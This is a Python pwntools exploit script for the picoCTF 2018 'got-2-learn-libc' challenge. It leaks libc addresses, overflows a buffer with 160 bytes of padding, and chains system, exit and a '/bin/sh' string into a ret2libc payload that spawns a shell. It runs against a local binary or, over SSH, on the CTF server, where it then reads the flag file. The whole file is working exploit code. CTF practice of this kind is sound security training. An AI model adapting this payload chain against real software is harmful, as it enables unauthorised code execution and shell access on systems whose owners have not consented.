#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

vuln = ELF('./vuln')
padding = 'A' * 160

# local libc
# libc = ELF("/usr/lib32/libc.so.6")
# remote libc
libc = ELF("./libc.so.6")
libc_system_addr = libc.symbols['system']
libc_exit_addr = libc.symbols['exit']
libc_puts_addr = libc.symbols['puts']

def local():
	
	io = vuln.process()
	io.recvuntil('puts: ')
	puts_addr = int(io.readline(), 16)

	io.readuntil('useful_string:')
	sh_addr = int(io.readline(), 16)

	libc_offset = puts_addr - libc_puts_addr

	system_addr = libc_system_addr + libc_offset
	exit_addr = libc_exit_addr + libc_offset

	payload = padding + p32(system_addr) + p32(exit_addr) + p32(sh_addr)
	io.sendline(payload)
	io.interactive()

def remote():
	
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee; ./vuln')

	io.recvuntil('puts: ')
	puts_addr = int(io.readline(), 16)

	io.readuntil('useful_string:')
	sh_addr = int(io.readline(), 16)

	libc_offset = puts_addr - libc_puts_addr

	system_addr = libc_system_addr + libc_offset
	exit_addr = libc_exit_addr + libc_offset

	payload = padding + p32(system_addr) + p32(exit_addr) + p32(sh_addr)
	io.sendline(payload)
	io.sendline('echo; cat flag.txt; echo')
	io.interactive()
	s.close()

if __name__ == '__main__':
	remote()